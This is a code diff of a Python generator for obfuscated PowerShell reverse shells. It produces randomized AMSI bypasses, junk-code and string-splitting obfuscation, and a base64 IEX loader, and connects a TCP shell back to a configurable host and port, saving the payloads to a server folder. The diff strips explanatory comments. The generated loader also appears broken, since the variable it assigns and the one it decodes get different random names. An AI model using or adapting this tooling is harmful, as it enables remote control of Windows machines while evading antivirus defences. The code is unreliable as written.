@@ -1,6 +1,7 @@
 import random
 import string
 import os
+import base64
 from datetime import datetime
 
 def rand_name(length=None):
@@ -8,14 +9,12 @@ def rand_name(length=None):
     return ''.join(random.choices(string.ascii_letters, k=length))
 
 def split_string(s):
-    # Splits a string into a "+"-joined sequence for obfuscation
     return '+'.join([f"'{c}'" for c in s])
 
 def random_whitespace():
     return ' ' * random.randint(1, 4) + '\t' * random.randint(0, 2)
 
 def junk_code():
-    # Random junk code: no-ops, weird variables, etc.
     j = [
         f"${rand_name()} = {random.randint(1,100)}",
         f"#{rand_name()}_{random.randint(1000,9999)}",
@@ -26,7 +25,6 @@ def junk_code():
     return random.choice(j) + random_whitespace()
 
 def amsi_bypass_variants(var):
-    # Returns a list of AMSI bypass options to randomly choose from
     variant1 = (
         f"{junk_code()}"
         f"${var['amsi_type']} = {split_string('AMSI')}\n"
@@ -35,13 +33,11 @@ def amsi_bypass_variants(var):
         f"${var['amsi_failed']} = ${{{var['amsi_field']}}}.GetField(${{{var['amsi_type']}}}+{split_string('InitFailed')},'NonPublic,Static')\n"
         f"${var['amsi_failed']}.SetValue($null,$true)"
     )
-
     variant2 = (
         f"{junk_code()}"
         "[Ref].Assembly.GetType(" + split_string("System.Management.Automation.AmsiUtils") + ")."
         "GetField(" + split_string("amsiInitFailed") + ", 'NonPublic,Static').SetValue($null, $true)"
     )
-
     variant3 = (
         f"{junk_code()}"
         "$w = @'\nusing System;\nusing System.Runtime.InteropServices;\n"
@@ -59,16 +55,13 @@ def amsi_bypass_variants(var):
     return [variant1, variant2, variant3]
 
 def generate_obfuscated_ps(host="localhost", port=1443, write_file=True):
-    # Randomized variable names
     var = {k: rand_name() for k in [
         "amsi_type", "amsi_field", "amsi_failed", "tcpclient", "stream", "bytes", "i", "data", "sendback",
         "sendback2", "sendbyte", "encoding", "outstr"
     ]}
-
-    # Randomly select an AMSI bypass
     amsi_bypass = random.choice(amsi_bypass_variants(var))
 
-    # The actual reverse shell (inner payload), heavily obfuscated
+    # Reverse shell core logic
     core_shell = f"""
 {junk_code()}
 ${var['tcpclient']}={random_whitespace()}New-Object {split_string('System.Net.Sockets.TCPClient')}('{host}',{port})
@@ -87,33 +80,19 @@ while((${{var['i']}}=${{{var['stream']}}}.Read(${{{var['bytes']}}},0,${{{var['by
 {junk_code()}
 """.strip()
 
-    # Base64 encode the core shell, so the outer loader only runs: decode + IEX
+    # Always use base64 for compatibility
     core_shell_bytes = core_shell.encode('utf-8')
-    core_shell_b64 = core_shell_bytes.hex() if random.choice([True, False]) else core_shell_bytes
-    if isinstance(core_shell_b64, bytes):
-        import base64
-        core_shell_b64 = base64.b64encode(core_shell_bytes).decode()
+    core_shell_b64 = base64.b64encode(core_shell_bytes).decode()
 
-    loader_type = random.choice(["base64", "hex"])
-    if loader_type == "base64":
-        loader = f"""
+    loader = f"""
 {amsi_bypass}
 {junk_code()}
 ${rand_name()} = '{core_shell_b64}'
 {junk_code()}
 IEX ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(${rand_name()})))
-"""
-    else:
-        # hex encoded loader
-        loader = f"""
-{amsi_bypass}
-{junk_code()}
-${rand_name()} = '{core_shell_bytes.hex()}'
-{junk_code()}
-IEX ([Text.Encoding]::UTF8.GetString(([System.Convert]::FromBase64String(([System.Text.Encoding]::UTF8.GetString(([System.Convert]::FromHexString(${rand_name()}))))))))
-"""
+""".strip()
 
-    ps = loader.strip()
+    ps = loader
 
     if write_file:
         folder = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'server', 'payloads'))
